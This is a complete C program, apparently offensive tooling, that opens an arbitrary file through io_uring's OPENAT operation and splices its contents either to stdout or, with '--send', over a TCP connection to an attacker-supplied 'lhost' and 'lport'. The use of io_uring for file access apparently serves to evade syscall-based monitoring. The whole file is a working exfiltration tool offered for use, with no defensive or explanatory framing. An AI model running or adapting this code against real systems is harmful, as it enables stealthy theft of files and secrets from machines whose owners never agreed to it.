#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <linux/io_uring.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#include "../io_uring/iouring_utils.h"

#define SPLICE_CHUNK (1024 * 1024)

static int tcp_connect(const char *host, uint16_t port)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { perror("socket"); return -1; }
    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET; sa.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &sa.sin_addr) <= 0) {
        fprintf(stderr, "inet_pton: bad address %s\n", host); close(fd); return -1;
    }
    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        perror("connect"); close(fd); return -1;
    }
    return fd;
}

static int uring_open(struct uring *u, const char *path)
{
    struct io_uring_sqe *sqe = uring_get_sqe(u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = O_RDONLY;
    struct io_uring_cqe cqe;
    uring_submit_wait(u, 1);
    uring_peek_cqe(u, &cqe);
    return (int)cqe.res;
}

static ssize_t splice_file_to_dst(int src_fd, int dst_fd)
{
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("pipe"); return -1; }

    struct stat st;
    int dst_splice_ok = (fstat(dst_fd, &st) == 0) &&
                        (S_ISSOCK(st.st_mode) || S_ISFIFO(st.st_mode));

    char buf[65536];
    ssize_t total = 0;
    while (1) {
        ssize_t n = splice(src_fd, NULL, pipefd[1], NULL, SPLICE_CHUNK,
                           SPLICE_F_MOVE | SPLICE_F_MORE);
        if (n < 0) {
            if (errno == EAGAIN) continue;
            break;
        }
        if (n == 0) break;

        ssize_t written = 0;
        while (written < n) {
            ssize_t w;
            if (dst_splice_ok) {
                w = splice(pipefd[0], NULL, dst_fd, NULL,
                           (size_t)(n - written), SPLICE_F_MOVE);
                if (w < 0) { perror("splice->dst"); goto done; }
            } else {
                ssize_t r = read(pipefd[0], buf, sizeof(buf) < (size_t)(n - written)
                                               ? sizeof(buf) : (size_t)(n - written));
                if (r <= 0) goto done;
                w = write(dst_fd, buf, (size_t)r);
                if (w < 0) { perror("write->dst"); goto done; }
            }
            written += w;
        }
        total += n;
    }
done:
    close(pipefd[0]); close(pipefd[1]);
    return total;
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        return 1;
    }

    const char *mode = argv[1];
    const char *path = argv[2];

    struct uring u = {};
    if (uring_init(&u, 8) < 0) { perror("uring_init"); return 1; }

    printf("[*] open %s\n", path);
    int src_fd = uring_open(&u, path);
    if (src_fd < 0) {
        fprintf(stderr, "[-] open(%s): errno %d\n", path, -src_fd);
        uring_free(&u); return 1;
    }
    printf("[+] fd=%d\n", src_fd);

    int dst_fd;
    if (strcmp(mode, "--stdout") == 0) {
        dst_fd = STDOUT_FILENO;
    } else if (strcmp(mode, "--send") == 0) {
        if (argc < 5) {
            fprintf(stderr, "[-] missing host/port\n"); return 1;
        }
        const char *lhost = argv[3];
        uint16_t lport    = (uint16_t)atoi(argv[4]);
        printf("[*] connecting %s:%u\n", lhost, lport);
        dst_fd = tcp_connect(lhost, lport);
        if (dst_fd < 0) { close(src_fd); uring_free(&u); return 1; }
        printf("[+] connected\n");
    } else {
        fprintf(stderr, "[-] unknown mode: %s\n", mode);
        close(src_fd); uring_free(&u); return 1;
    }

    ssize_t total = splice_file_to_dst(src_fd, dst_fd);
    printf("\n[+] %zd bytes via splice\n", total);

    close(src_fd);
    if (dst_fd != STDOUT_FILENO) close(dst_fd);
    uring_free(&u);
    return total < 0 ? 1 : 0;
}
